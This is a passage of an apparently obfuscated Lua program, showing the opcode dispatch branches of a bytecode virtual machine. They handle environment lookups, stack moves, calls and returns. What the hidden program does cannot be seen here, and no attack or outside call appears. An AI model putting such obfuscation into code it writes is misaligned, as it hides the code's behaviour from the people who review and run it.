                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local B;
                    local A;
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  end
                elseif (Enum <= 40) then
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 41) then
                  local Results;
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Stk[A + 1]));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                  Edx = 0;
                  for Idx = A, Inst[4] do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 45) then
                if (Enum <= 43) then
                  local A;
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum > 44) then
                  local A = Inst[2];
                  local Results, Limit = _R(Stk[A]());
                  Top = (Limit + A) - 1;
                  local Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Stk[A + 1]);
                end
              elseif (Enum <= 47) then
                if (Enum > 46) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum == 48) then
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                for Idx = Inst[2], Inst[3] do
                  Stk[Idx] = nil;
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local A = Inst[2];
                Stk[A](Stk[A + 1]);
              end
            elseif (Enum <= 74) then
              if (Enum <= 61) then
                if (Enum <= 55) then
                  if (Enum <= 52) then
                    if (Enum <= 50) then
                      if not Stk[Inst[2]] then
                        VIP = VIP + 1;
                      else
                        VIP = Inst[3];
                      end
                    elseif (Enum > 51) then
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    else
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    end
                  elseif (Enum <= 53) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum == 54) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local A = Inst[2];
                    local Index = Stk[A];
                    local Step = Stk[A + 2];
                    if (Step > 0) then
                      if (Index > Stk[A + 1]) then
                        VIP = Inst[3];
                      else
                        Stk[A + 3] = Index;
                      end
                    elseif (Index < Stk[A + 1]) then
                      VIP = Inst[3];
                    else
                      Stk[A + 3] = Index;
                    end
                  end
                elseif (Enum <= 58) then
                  if (Enum <= 56) then
                    local A = Inst[2];
                    local Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                    local Edx = 0;
                    for Idx = A, Inst[4] do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                  elseif (Enum > 57) then
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Stk[A + 1]);
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Upvalues[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  else
                    local Edx;
                    local Results, Limit;
                    local A;
                    local K;
                    local B;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    B = Inst[3];
                    K = Stk[B];
                    for Idx = B + 1, Inst[4] do
                      K = K .. Stk[Idx];
                    end
                    Stk[Inst[2]] = K;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 59) then
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                elseif (Enum == 60) then
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A]());
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 67) then
                if (Enum <= 64) then
                  if (Enum <= 62) then
                    local B;
                    local A;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
